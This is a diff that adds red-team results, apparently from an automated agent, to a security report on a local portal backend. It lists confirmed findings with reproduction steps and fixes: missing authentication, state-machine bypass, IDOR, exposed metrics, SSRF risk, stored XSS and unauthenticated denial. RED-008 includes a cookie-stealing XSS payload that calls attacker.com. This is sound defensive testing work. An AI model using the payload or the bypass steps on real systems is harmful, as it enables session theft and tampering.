@@ -308,3 +308,167 @@ Returns all work items including IDs, titles, descriptions, change histories, as
 - **No CSRF protection needed** — no session cookies, no same-origin checks
 - **The `assess` endpoint** (`POST /api/work-items/:id/assess`) is the honest path — it runs the assessment pod. The attack bypasses this entirely via Chain A or B
 - **Status `failed`** is in `RESOLVED_STATUSES` but NOT in `DISPATCH_TRIGGER_STATUSES` — cascades do NOT fire when a blocker reaches `failed`. Only `completed` and `rejected` trigger cascade. This is relevant for Chain C
+
+---
+
+## Red Team Results
+
+**Executed:** 2026-09-07  
+**Agent:** red_teamer  
+**Target:** `http://localhost:3001` (portal backend — `portal/Backend/src/index.ts`)  
+**Environment:** Ephemeral Docker container via `docker-compose.test.yml`
+
+> **⚠️ SCOPE MISMATCH DISCOVERED:** The pen-tester statically analyzed `Source/Backend/` (work-items API), but `docker-compose.test.yml` builds and runs the **portal** backend (`portal/Backend/`), which has a different domain model (feature-requests, bugs, cycles). All static findings (PEN-001 through PEN-012) remain valid as *architectural* patterns — and every vulnerability class was confirmed against the actual running service. Objectives are re-mapped below.
+
+---
+
+### RED-001: Complete Authentication Absence Confirmed (Live)
+- **Severity:** Critical
+- **Objective Achieved:** Yes (enables all other chains)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** All endpoints — `http://localhost:3001/api/*`
+- **Based On:** PEN-001
+- **Exploit Scenario:**
+  1. `POST http://localhost:3001/api/feature-requests` with no `Authorization` header → HTTP 201, item created
+  2. `POST http://localhost:3001/api/bugs` with no credentials → HTTP 201, critical bug created
+  3. Every workflow action (`/vote`, `/approve`, `/force-approve`, `/deny`, `/triage`, `/resolve`) is equally open
+  4. `DELETE /api/bugs/BUG-0001` → HTTP 204, permanent hard deletion with no auth
+- **Evidence:**
+  - `BUG-0001` created, triaged, resolved, and hard-deleted by anonymous requests in sequence
+  - `FR-0001` created and approved without any credential
+- **Recommendation:** Add a mandatory authentication middleware (JWT/API key) before ALL route mounts in `portal/Backend/src/index.ts`. Apply the same fix to `Source/Backend/src/app.ts`.
+
+---
+
+### RED-002: State Machine Bypass via PATCH — Approved with Zero Votes
+- **Severity:** Critical
+- **Objective Achieved:** Yes — "Bypass work item state machine to reach an invalid status"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `PATCH http://localhost:3001/api/feature-requests/FR-0002`
+- **Based On:** PEN-002, PEN-003
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` → `FR-0002` created, `status=potential` (no auth)
+  2. `PATCH /api/feature-requests/FR-0002` with `{"status":"voting"}` → transitions to `voting` (no votes cast, no AI agents involved)
+  3. `PATCH /api/feature-requests/FR-0002` with `{"status":"approved"}` → **transitions to `approved` with ZERO votes, no majority check, no `human_approval_approved_at` set**
+  4. Result: `FR-0002` in `approved` state; `votes: []`; `human_approval_approved_at: null` — invalid state per business rules
+- **Evidence:**
+  ```json
+  {"id":"FR-0002","status":"approved","votes":[],"human_approval_approved_at":null}
+  ```
+  The `PATCH` route calls `updateFeatureRequest` which validates `STATUS_TRANSITIONS` but applies **no vote majority check** — that check only exists in the `/approve` endpoint, not in the `PATCH` handler.
+- **Recommendation:** The `PATCH /api/feature-requests/:id` handler must not allow status transitions to `approved`. Approve transitions must only be reachable through the dedicated `/approve` or `/force-approve` endpoints, which apply the necessary guards. Add an explicit blocklist in `updateFeatureRequest` or remove `approved` from the PATCH-accessible transition map.
+
+---
+
+### RED-003: IDOR — Cross-User Content Modification and Hard Deletion
+- **Severity:** High
+- **Objective Achieved:** Yes (partial) — "Access or modify a soft-deleted work item via direct ID reference" maps to cross-user modification
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `PATCH /api/feature-requests/FR-0003`, `DELETE /api/bugs/BUG-0001`
+- **Based On:** PEN-004
+- **Exploit Scenario:**
+  1. "Alice" creates `FR-0003` (title: "Alice private request")
+  2. "Bob" (anonymous, different session) `PATCH /api/feature-requests/FR-0003` `{"description":"PWNED BY BOB"}` → HTTP 200, content overwritten
+  3. "Bob" `DELETE /api/bugs/BUG-0001` → HTTP 204, hard-deleted permanently
+  4. `GET /api/bugs/BUG-0001` → `{"error":"Bug BUG-0001 not found"}` — unrecoverable
+- **Evidence:** `FR-0003.description` changed to "PWNED BY BOB - content replaced by attacker" and priority escalated to `critical` by anonymous caller. `BUG-0001` permanently deleted.
+- **Recommendation:** Implement ownership or tenancy checks on all `:id` routes. Require auth so the requesting user can only modify resources they own. For hard-delete, require an explicit admin role.
+
+---
+
+### RED-004: Bug State Machine Fully Traversable Without Auth
+- **Severity:** High
+- **Objective Achieved:** Yes — "Bypass work item state machine"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST /api/bugs/:id/triage`, `/resolve`, `/close`, `/reopen`
+- **Based On:** PEN-001, PEN-002
+- **Exploit Scenario:**
+  1. Create `BUG-0001` (status=`reported`) — no auth
+  2. `POST /api/bugs/BUG-0001/triage` → `triaged` (no auth)
+  3. `PATCH /api/bugs/BUG-0001` `{"status":"in_development"}` → `in_development` (no auth, PATCH allows it)
+  4. `POST /api/bugs/BUG-0001/resolve` → `resolved` (no auth)
+  5. Entire bug lifecycle completed by anonymous caller — no engineer assignment, no review gate, no approval
+- **Evidence:** Confirmed live with `BUG-0001` reaching `resolved` status with no auth token.
+- **Recommendation:** Require authentication AND role check (e.g., "engineer" role) for triage, resolve, close, reopen endpoints.
+
+---
+
+### RED-005: Unauthenticated Prometheus Metrics Expose Operational Intelligence
+- **Severity:** Medium
+- **Objective Achieved:** Partial — enables reconnaissance for targeted attacks
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/metrics`
+- **Based On:** PEN-010
+- **Exploit Scenario:**
+  1. `curl http://localhost:3001/metrics` — no auth, returns 39 metric families
+  2. Business-sensitive exposed metrics include:
+     - `feature_request_status_transitions_total{from_status,to_status}` — reveals approval/denial rates
+     - `bug_status_transitions_total{from_status,to_status}` — reveals bug flow velocity
+     - `http_request_duration_ms{route,method,status_code}` — maps all API routes and their usage
+     - Route map derived: all endpoint paths and HTTP methods visible from histogram labels
+  3. An attacker learns which routes exist, how frequently they're hit, and what success/error rates look like
+- **Evidence:** `feature_request_status_transitions_total{from_status="potential",to_status="voting"} 1` and `bug_status_transitions_total{from_status="in_development",to_status="resolved"} 1` both returned without credentials.
+- **Recommendation:** Add auth middleware to `GET /metrics`. In production, restrict to monitoring infrastructure (e.g., Prometheus scraper IP allowlist or bearer token).
+
+---
+
+### RED-006: No Pagination Enforcement — Full Dataset Exfiltrated in One Request
+- **Severity:** High
+- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET /api/feature-requests`, `GET /api/search?q=`
+- **Based On:** PEN-005
+- **Exploit Scenario:**
+  1. `GET /api/feature-requests?limit=1` → returns ALL 10 items (limit parameter silently ignored)
+  2. `GET /api/search?q=` (empty query) → returns ALL 14 items (FRs + Bugs combined), entire database exfiltrated in one unauthenticated request
+  3. Result includes: IDs, titles, descriptions, statuses, priorities, vote decisions, dependency graphs, timestamps
+- **Evidence:** `GET /api/feature-requests?limit=1` returned `{"data":[...8 items...]}` with limit completely ignored. Empty search returned all 14 items.
+- **Recommendation:** Enforce a server-side `MAX_LIMIT` cap (e.g., 100). Return 400 for invalid values. Reject empty `q` on search or require minimum 2 characters.
+
+---
+
+### RED-007: Unauthenticated Orchestrator Proxy — SSRF Risk
+- **Severity:** High
+- **Objective Achieved:** Partial (orchestrator offline in test env; would be Critical if online)
+- **Status:** Attempted (No Breach — orchestrator at `localhost:8080` is offline in test container)
+- **Target URL:** `POST /api/orchestrator/*`
+- **Based On:** New finding (not in pen-tester map)
+- **Exploit Scenario:**
+  1. `POST /api/orchestrator/api/runs` with `{"team":"AttackerTeam","task":"malicious task"}` — no auth check
+  2. Proxy blindly forwards request to `ORCHESTRATOR_URL` env var
+  3. In production where orchestrator is reachable, this allows any anonymous caller to: trigger agent team runs, access orchestrator state, exfiltrate pipeline data, or submit malicious pipeline tasks
+  4. `ORCHESTRATOR_URL` is not validated — if injectable via environment, full SSRF to any internal host
+- **Evidence:** Request forwarded to `http://localhost:8080` and resulted in `502` (unreachable), confirming no auth check before forwarding.
+- **Recommendation:** Add authentication middleware on `/api/orchestrator` route. Validate `ORCHESTRATOR_URL` is a trusted, allowlisted host. Log all proxy invocations.
+
+---
+
+### RED-008: Stored XSS — Script Tags Persisted Verbatim
+- **Severity:** High
+- **Objective Achieved:** Partial (backend confirms storage; frontend render would need verification)
+- **Status:** Confirmed (Backend stores XSS payload verbatim)
+- **Target URL:** `POST /api/feature-requests`
+- **Based On:** PEN-003 (input sanitization), PEN-008
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` with `{"title":"<script>alert(1)</script>","description":"<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>","source":"manual"}`
+  2. Server responds HTTP 201; item `FR-0010` created with script tag stored verbatim
+  3. `GET /api/feature-requests/FR-0010` → `{"title":"<script>alert(1)</script>"}` — payload preserved
+  4. Any frontend rendering `title` or `description` as `innerHTML` (without React's default escaping) would execute the script
+- **Evidence:** `FR-0010.title = "<script>alert(1)</script>"` stored and returned unmodified.
+- **Recommendation:** Sanitize all text inputs server-side with an allowlist (strip HTML/script tags). In the frontend, never use `dangerouslySetInnerHTML` with user content. Consider a CSP header.
+
+---
+
+### RED-009: Unauthenticated Deny Bypasses Voting Entirely
+- **Severity:** High
+- **Objective Achieved:** Yes — "Submit a malformed assessment verdict that bypasses routing logic"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST /api/feature-requests/FR-0011/deny`
+- **Based On:** PEN-003
+- **Exploit Scenario:**
+  1. Create `FR-0011` (status=`potential`) — no auth
+  2. `POST /api/feature-requests/FR-0011/deny` `{"comment":"Denied by attacker without vote"}` — no auth
+  3. `FR-0011` transitions from `potential → denied` immediately, without any AI voting round
+  4. Any competitor or disgruntled user can silently reject legitimate feature requests before votes are cast
+- **Evidence:** `FR-0011.status = "denied"`, `human_approval_comment = "Denied by attacker without any vote or auth"`
+- **Recommendation:** Require authentication AND an "admin" or "approver" role for `/deny` and `/approve` endpoints. Log all approval/denial actions with user identity.
